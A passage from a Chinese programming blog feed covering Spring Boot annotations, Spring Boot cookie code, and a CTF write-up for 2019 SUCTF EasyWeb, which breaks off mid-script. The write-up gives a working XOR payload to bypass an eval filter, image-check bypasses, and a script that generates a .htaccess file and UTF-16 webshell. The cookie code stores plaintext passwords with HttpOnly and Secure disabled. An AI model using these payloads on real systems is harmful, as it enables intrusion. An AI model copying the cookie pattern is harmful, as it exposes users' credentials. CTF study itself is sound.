        <content type="html"><![CDATA[<p><em><strong>springboot的核心就是注解。springboot通过各种组合注解，极大地简化了spring项目的搭建和开发。采用纯java代码，不在需要配置繁杂的xml文件。类型安全对重构可以提供良好的支持。</strong></em></p><a id="more"></a><h2 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h2><p><b>@SpringBootApplication:包含了@ComponentScan、@Configuration和@EnableAutoConfiguration注解。</b></p><p>其中:</p><blockquote><p>@ComponentScan：让spring Boot扫描到Configuration类并把它加入到程序上下文。<br>@Configuration ：等同于spring的XML配置文件；使用Java代码可以检查类型安全。<br>@EnableAutoConfiguration ：自动配置。</p></blockquote><h2 id="RequestBody与-ResponseBody"><a href="#RequestBody与-ResponseBody" class="headerlink" title="@RequestBody与@ResponseBody"></a>@RequestBody与@ResponseBody</h2><p>&#x2F;&#x2F;注意并不要求@RequestBody与@ResponseBody成对使用。<br><br>@RequestBody修饰请求参数，注解用于接收HTTP的body，默认是使用JSON的格式<br><br>@ResponseBody修饰返回值，注解用于在HTTP的body中携带响应数据，默认是使用JSON的格式。如果不加该注解，spring响应字符串类型，是跳转到模板页面或jsp页面的开发模式。说白了：加上这个注解你开发的是一个数据接口，不加这个注解你开发的是一个页面跳转控制器。</p><p>@ResponseBody可以用于写数据加载的接口时候用，但是注意不要混淆了，一个是请求头一个时响应头。两者默认是传输以及接受自动转JSON格式，前端可以直接调用</p><h2 id="RequestMapping注解"><a href="#RequestMapping注解" class="headerlink" title="@RequestMapping注解"></a>@RequestMapping注解</h2><p><em>@RequestMapping注解是所有常用注解中，最有看点的一个注解，用于标注HTTP服务端点。它的很多属性对于丰富我们的应用开发方式方法，都有很重要的作用。</em></p><ul><li>value： 应用请求端点，最核心的属性，用于标志请求处理方法的唯一性；  </li><li>method： HTTP协议的method类型， 如：GET、POST、PUT、DELETE等；  </li><li>consumes： HTTP协议请求内容的数据类型（Content-Type），例如application&#x2F;json, text&#x2F;html;  </li><li>produces: HTTP协议响应内容的数据类型。下文会详细讲解。  </li><li>params： HTTP请求中必须包含某些参数值的时候，才允许被注解标注的方法处理请求。  </li><li>headers： HTTP请求中必须包含某些指定的header值，才允许被注解标注的方法处理请求。  <br></li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@RequestMapping</span>(value = <span class="string">"/路径"</span>, method = POST)</span><br><span class="line"><span class="variable">@PostMapping</span>(value = <span class="string">"/article"</span>)</span><br></pre></td></tr></table></figure><p>如果没有写method,应该是默认接受所有类型的。也就是PostMapping等同于@RequestMapping的method等于POST。同理：@GetMapping、@PutMapping、@DeleteMapping也都是简写的方式。</p><p><img src="/1.jpg"></p><p>我比较习惯直接用，这样默认接受get或者post。</p><h2 id="RestController与-Controller"><a href="#RestController与-Controller" class="headerlink" title="@RestController与@Controller"></a>@RestController与@Controller</h2><p>@Controller注解是开发中最常使用的注解，它的作用有两层含义：</p><blockquote><p>一是告诉Spring，被该注解标注的类是一个Spring的Bean，需要被注入到Spring的上下文环境中。<br>二是该类里面所有被RequestMapping标注的注解都是HTTP服务端点。</p></blockquote><p>@RestController相当于 @Controller和@ResponseBody结合。它有两层含义：</p><blockquote><p>一是作为Controller的作用，将控制器类注入到Spring上下文环境，该类RequestMapping标注方法为HTTP服务端点。<br>二是作为ResponseBody的作用，请求响应默认使用的序列化方式是JSON，而不是跳转到jsp或模板页面。</p></blockquote><h3 id="总结来说就是，如果用的是Controller，接收到请求后返回的是一个跳转地址"><a href="#总结来说就是，如果用的是Controller，接收到请求后返回的是一个跳转地址" class="headerlink" title="总结来说就是，如果用的是Controller，接收到请求后返回的是一个跳转地址"></a>总结来说就是，如果用的是Controller，接收到请求后返回的是一个跳转地址</h3><p>比如说：</p><p><img src="/2.jpg"></p><p>jump就是一个跳转地址，进入index接口后返回的是一个login.html页面地址</p><h3 id="如果是RestController"><a href="#如果是RestController" class="headerlink" title="如果是RestController"></a>如果是RestController</h3><p>就是为，接受到请求后，ResponseBody作用返回一个JSon数据</p><p>比如说：</p><p><img src="/3.jpg"></p><p>进入&#x2F;test,index接口后，会获取数据，结果返回的是一个Json字符串</p><h2 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h2><p><em>我们编写spring 框架的代码时候。一直遵循是这样一个规则：所有在spring中注入的bean 都建议定义成私有的域变量。并且要配套写上 get 和 set方法。<br>Spring 2.5 引入了 @Autowired 注释，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。 通过 @Autowired的使用来消除 set ，get方法。Spring 通过一个 BeanPostProcessor 对 @Autowired 进行解析，所以要让 @Autowired 起作用必须事先在 Spring 容器中声明 AutowiredAnnotationBeanPostProcessor Bean。</em></p><p>具体使用详情：</p><p><img src="/4.jpg"></p><p>@Autowired 将查找被标注的方法的入参类型的 Bean，并调用方法自动注入这些 Bean。</p>]]></content>
      
      
      <categories>
          
          <category> Spring-boot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-boot框架-Cookie使用</title>
      <link href="/2019/12/06/Spring-boot-Cookie%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/12/06/Spring-boot-Cookie%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-Boot是一个简化Spring开发的框架。用来监护spring应用开发，约定大于配置，去繁就简，just-run-就能创建一个独立的，产品级的应用。"><a href="#Spring-Boot是一个简化Spring开发的框架。用来监护spring应用开发，约定大于配置，去繁就简，just-run-就能创建一个独立的，产品级的应用。" class="headerlink" title="Spring Boot是一个简化Spring开发的框架。用来监护spring应用开发，约定大于配置，去繁就简，just run 就能创建一个独立的，产品级的应用。"></a>Spring Boot是一个简化Spring开发的框架。用来监护spring应用开发，约定大于配置，去繁就简，just run 就能创建一个独立的，产品级的应用。</h2><h2 id="我们在使用Spring-Boot时只需要配置相应的Spring-Boot就可以用所有的Spring组件，简单的说，spring-boot就是整合了很多优秀的框架，不用我们自己手动的去写一堆xml配置然后进行配置。从本质上来说，Spring-Boot就是Spring-它做了那些没有它你也会去做的Spring-Bean配置。"><a href="#我们在使用Spring-Boot时只需要配置相应的Spring-Boot就可以用所有的Spring组件，简单的说，spring-boot就是整合了很多优秀的框架，不用我们自己手动的去写一堆xml配置然后进行配置。从本质上来说，Spring-Boot就是Spring-它做了那些没有它你也会去做的Spring-Bean配置。" class="headerlink" title="我们在使用Spring Boot时只需要配置相应的Spring Boot就可以用所有的Spring组件，简单的说，spring boot就是整合了很多优秀的框架，不用我们自己手动的去写一堆xml配置然后进行配置。从本质上来说，Spring Boot就是Spring,它做了那些没有它你也会去做的Spring Bean配置。"></a>我们在使用Spring Boot时只需要配置相应的Spring Boot就可以用所有的Spring组件，简单的说，spring boot就是整合了很多优秀的框架，不用我们自己手动的去写一堆xml配置然后进行配置。从本质上来说，Spring Boot就是Spring,它做了那些没有它你也会去做的Spring Bean配置。</h2><a id="more"></a><h2 id="使用Cookie原因"><a href="#使用Cookie原因" class="headerlink" title="使用Cookie原因"></a>使用Cookie原因</h2><p><b>首先本来是准备用Session，但是Session在会话断开后就消失了，考虑到老师们可能会中途因为一个紧急消息就先跳转出去种植会话，所以我选择使用Cookie</b><br><br></p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>首先创建一个cookie类 CookieUtil</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static void set<span class="constructor">Cookie(HttpServletResponse <span class="params">response</span>, String <span class="params">key</span>, String <span class="params">value</span>, <span class="params">int</span> <span class="params">expiry</span>)</span>&#123;</span><br><span class="line">    Cookie cookie = <span class="keyword">new</span> <span class="constructor">Cookie(<span class="params">key</span>, <span class="params">value</span>)</span>; <span class="comment">//key 为cookie内容名字，value为cookie 类型</span></span><br><span class="line">    cookie.set<span class="constructor">MaxAge(<span class="params">expiry</span>)</span>;       <span class="comment">//cookie过期时间</span></span><br><span class="line">    cookie.set<span class="constructor">Secure(<span class="params">true</span>)</span>;  </span><br><span class="line">    cookie.set<span class="constructor">HttpOnly(<span class="params">true</span>)</span>;  </span><br><span class="line">    response.add<span class="constructor">Cookie(<span class="params">cookie</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="什么是HttpOnly？"><a href="#什么是HttpOnly？" class="headerlink" title="什么是HttpOnly？"></a>什么是HttpOnly？</h3><p>HttpOnly是Set-Cookie HTTP响应头中包含的附加标志。生成cookie时使用HttpOnly标志有助于降低客户端脚本访问受保护cookie的风险（如果浏览器支持它）。<br>如果HTTP响应头中包含HttpOnly标志，只要浏览器支持HttpOnly标志，客户端脚本就无法访问cookie。因此，即使存在跨站点脚本（XSS）缺陷，且用户意外访问利用此漏洞的链接，浏览器也不会向第三方透露cookie。<br>如果浏览器不支持HttpOnly并且网站尝试设置HttpOnly cookie，浏览器会忽略HttpOnly标志，从而创建一个传统的，脚本可访问的cookie。<br>大多数XSS攻击的目的都是盗窃cookie。服务端可以通过在它创建的cookie上设置HttpOnly标志来缓解这个问题，指出不应在客户端上访问cookie。<br>客户端脚本代码尝试读取包含HttpOnly标志的cookie，如果浏览器支持HttpOnly，则返回一个空字符串作为结果。这样能够阻止恶意代码（通常是XSS攻击）将cookie数据发到攻击者网站。</p><br><p>综上所述：<br></p><p><b>设置HttpOnly可以防止一些最基础的xss，但是不能防止页面跳转后获取cookie</b><br></p><p><b>没有绝对的安全</b></p><h3 id="什么是Secure"><a href="#什么是Secure" class="headerlink" title="什么是Secure?"></a>什么是Secure?</h3><p>当设置Cookie中Secure为true,则指示浏览器仅通过 HTTPS 连接传回 cookie。这可以确保 cookie ID 是安全的，且仅用于使用 HTTPS 的网站。如果启用此功能，则 HTTP 上的会话 Cookie 将不再起作用。</p><h2 id="控制器中进行配置"><a href="#控制器中进行配置" class="headerlink" title="控制器中进行配置"></a>控制器中进行配置</h2><h3 id="返回Set-Cookie"><a href="#返回Set-Cookie" class="headerlink" title="返回Set-Cookie"></a>返回Set-Cookie</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public String index(HttpServletRequest request, HttpServletResponse response, String username, String password)&#123;              <span class="comment">//传入后端</span></span><br><span class="line">        User user = userMapper.select<span class="constructor">ByPrimaryKey(<span class="params">username</span>)</span>;</span><br><span class="line">        <span class="keyword">if</span>(user.get<span class="constructor">Password()</span>.equals(password))&#123;</span><br><span class="line">           <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(user);</span><br><span class="line">            CookieUtil cookie = <span class="keyword">new</span> <span class="constructor">CookieUtil()</span>;</span><br><span class="line">            <span class="built_in">int</span> expire = <span class="number">60</span><span class="operator"> * </span><span class="number">60</span><span class="operator"> * </span><span class="number">24</span><span class="operator"> * </span><span class="number">7</span>;  <span class="comment">//cookie时间为90天</span></span><br><span class="line">            cookie.set<span class="constructor">Cookie(<span class="params">response</span>,<span class="string">"logUsername"</span>,<span class="params">user</span>.<span class="params">getUsername</span>()</span>,expire);        <span class="comment">//给他们cookie</span></span><br><span class="line">            cookie.set<span class="constructor">Cookie(<span class="params">response</span>,<span class="string">"logPassword"</span>,<span class="params">user</span>.<span class="params">getPassword</span>()</span>,expire);</span><br><span class="line">            return <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">user</span>)</span>;           <span class="comment">//返回教师名字以及权力的json</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            return <span class="string">"fail"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>PS：request为请求头，response为响应头</p><p><b>这段代码为，当登陆传入账号和密码，以及响应头后，确认账号密码存在，服务器返回响应报文给客户端，响应的Response Header中的Set-Cookie就是告诉客户端为当前页面设置Cookie，当客户端接收到Set-Cookie后下次请求会自动带上Cookie</b></p><p>我这边Cookie时间设置成3个月，因为项目中对快捷登陆要求较高，能方便点就方便点。</p><h3 id="利用Cookie"><a href="#利用Cookie" class="headerlink" title="利用Cookie"></a>利用Cookie</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public String log<span class="constructor">Filling(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span>&#123;</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="module-access"><span class="module"><span class="identifier">CookieUtil</span>.</span></span>get<span class="constructor">Cookies(<span class="params">request</span>)</span>;</span><br><span class="line">        String username = map.get(<span class="string">"logUsername"</span>);</span><br><span class="line">        List&lt;useClass&gt; useClassList = useClassMapper.select<span class="constructor">UseClass(<span class="params">username</span>)</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(useClassList.size<span class="literal">()</span>);</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span><span class="keyword">to</span><span class="constructor">JSONString(<span class="params">useClassList</span>)</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><b>大致为当页面访问logFilling页面时，我获取他request请求头带来的Cookie的信息，来进行信息的预查询</b></p><p>简单访问：</p><p><img src="/1.jpg"></p><p>发现可以访问成功，并且Cookies还多出了两项。</p><p><img src="/2.jpg"></p><p>因为某种原因我还为设置Httponly,以及Secure。</p><p>附Cookie类代码（全）</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.logSystem.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="keyword">HashMap</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> class CookieUtil &#123;</span><br><span class="line">    <span class="comment">//设置Cookie</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> setCookie(HttpServletResponse response, <span class="keyword">String</span> <span class="built_in">key</span>, <span class="keyword">String</span> value, <span class="built_in">int</span> expiry)&#123;</span><br><span class="line">        Cookie cookie = <span class="keyword">new</span> Cookie(<span class="built_in">key</span>, value); <span class="comment">//key 为cookie内容名字，value为cookie 类型</span></span><br><span class="line">        cookie.setMaxAge(expiry);       <span class="comment">//cookie过期时间</span></span><br><span class="line"><span class="comment">//      cookie.setSecure(true);  //安全的cookie是仅可以通过加密的HTTPS连接发送到服务器的cookie。无法通过未加密的HTTP连接将cookie发送到服务器。也就是说，如果设置了setSecure(true)，该Cookie将无法在Http连接中传输，只能是Https连接中传输。</span></span><br><span class="line"><span class="comment">//      cookie.setHttpOnly(true);  //不能被js访问的Cookie</span></span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取所有Cookie</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map&lt;<span class="keyword">String</span>, <span class="keyword">String</span>&gt; getCookies(HttpServletRequest request)&#123;</span><br><span class="line">        Map&lt;<span class="keyword">String</span>, <span class="keyword">String</span>&gt; <span class="built_in">map</span> = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;&gt;();</span><br><span class="line">        Cookie cookies[] = request.getCookies();</span><br><span class="line">        <span class="keyword">if</span> (cookies != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; cookies.length; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="string">"JSESSION"</span>.equals(cookies[i].getName()))</span><br><span class="line">                    <span class="built_in">map</span>.put(cookies[i].getName(), cookies[i].getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//清空所有的Cookie                                               点击退出按钮后</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="built_in">clear</span>(HttpServletRequest request, HttpServletResponse response)&#123;</span><br><span class="line">        Map&lt;<span class="keyword">String</span>, <span class="keyword">String</span>&gt; <span class="built_in">map</span> = getCookies(request);</span><br><span class="line">        Iterator&lt;Map.Entry&lt;<span class="keyword">String</span>, <span class="keyword">String</span>&gt;&gt; iter = <span class="built_in">map</span>.entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span>(iter.hasNext())&#123;</span><br><span class="line">            Map.Entry&lt;<span class="keyword">String</span>, <span class="keyword">String</span>&gt; me = iter.next();</span><br><span class="line">            Cookie cookie = <span class="keyword">new</span> Cookie(me.getKey(), <span class="string">""</span>);</span><br><span class="line">            cookie.setMaxAge(<span class="number">0</span>);</span><br><span class="line">            response.addCookie(cookie);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Spring-boot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019SUCTF EasyWeb</title>
      <link href="/2019/12/01/2019SUCTF-EasyWeb/"/>
      <url>/2019/12/01/2019SUCTF-EasyWeb/</url>
      
        <content type="html"><![CDATA[<h2 id="open-basedir-异或-htaccess"><a href="#open-basedir-异或-htaccess" class="headerlink" title="open_basedir+异或+.htaccess"></a>open_basedir+异或+.htaccess</h2><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    $userdir = <span class="string">"upload/tmp_"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists($userdir))&#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">"file"</span>]))&#123;</span><br><span class="line">        $tmp_name = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">        $name = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">        $extension = substr($name, strrpos($name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/ph/i"</span>,$extension)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents($tmp_name), <span class="string">'&lt;?'</span>)!==<span class="keyword">False</span>) <span class="keyword">die</span>(<span class="string">"^_^"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype($tmp_name)) <span class="keyword">die</span>(<span class="string">"^_^"</span>); </span><br><span class="line">        $path= $userdir.<span class="string">"/"</span>.$name;</span><br><span class="line">        @move_uploaded_file($tmp_name, $path);</span><br><span class="line">        print_r($path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);</span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br></pre></td></tr></table></figure><p><b> 分为两部分，思路是调用get_the_flag()函数</b></p><hr><h2 id="第一部分函数绕过"><a href="#第一部分函数绕过" class="headerlink" title="第一部分函数绕过"></a>第一部分函数绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$hhh = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$hhh)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($hhh)&gt;<span class="number">18</span>)&#123;     <span class="comment">//限制18位</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'One inch long, one inch strong!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span>, $hhh) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Try something else!'</span>);<span class="comment">//正则只能16进制</span></span><br><span class="line"></span><br><span class="line">$character_type = count_chars($hhh, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen($character_type)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">"Almost there!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($hhh);</span><br></pre></td></tr></table></figure><p><b>通过正则匹配脚本发现能用的不多<br>利用不可见字符异或来构造：</b></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$payload = <span class="string">''</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($argv[<span class="number">1</span>]);$i++)</span></span><br><span class="line"><span class="php">&#123;   </span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">255</span>;$j++)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $k = chr($j)^chr(<span class="number">255</span>);  <span class="comment">//dechex(255) = ff</span></span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>($k == $argv[<span class="number">1</span>][$i])</span></span><br><span class="line"><span class="php">            $payload .= <span class="string">'%'</span>.dechex($j);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $payload;</span></span><br></pre></td></tr></table></figure><p>payload：<br></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>ff=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure><p>发现phpinfo()能构造成功</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff<span class="meta">%</span>ff^<span class="meta">%</span>a<span class="number">0</span><span class="meta">%</span>b<span class="number">8</span><span class="meta">%</span>ba<span class="meta">%</span>ab&#125;&#123;<span class="meta">%</span>ff&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span>ff=get_the_flag</span><br></pre></td></tr></table></figure><br><p>就此绕过第一段<br></p><hr><h2 id="第二部分函数绕过"><a href="#第二部分函数绕过" class="headerlink" title="第二部分函数绕过"></a>第二部分函数绕过</h2><p>一个过滤正则基本把东西都匹配了，只是这次刚好就是apache+php环境了,但是还有一个.htaccess</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">exif_imagetype</span><span class="params">()</span></span> 的绕过方式</span><br><span class="line">    可以用<span class="string">"\x00\x00\x8a\x39\x8a\x39"</span></span><br><span class="line">    也可以用<span class="string">"#define width 1337"</span></span><br><span class="line">            <span class="string">"#define height 1337"</span></span><br></pre></td></tr></table></figure><p><b>这里注意到php版本为7.2所以，不能用&#x2F;&lt;script&gt;标签绕过&lt;?的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass</b></p><p><img src="/1.jpg"></p><p>自动生成.htaccess,以及🐎的脚本</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SIZE_HEADER = b<span class="string">"\n\n#define width 1337\n#define height 1337\n\n"</span></span><br><span class="line"></span><br><span class="line">def generate_php_file(filename, script):</span><br><span class="line">phpfile = <span class="built_in">open</span>(filename, <span class="string">'wb'</span>) </span><br><span class="line"></span><br><span class="line">phpfile.<span class="built_in">write</span>(script.encode(<span class="string">'utf-16be'</span>))</span><br><span class="line">phpfile.<span class="built_in">write</span>(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">phpfile.<span class="built_in">close</span>()</span><br><span class="line">def generate_htacess():</span><br><span class="line">htaccess = <span class="built_in">open</span>(<span class="string">'.htaccess'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">htaccess.<span class="built_in">write</span>(SIZE_HEADER)</span><br><span class="line">htaccess.<span 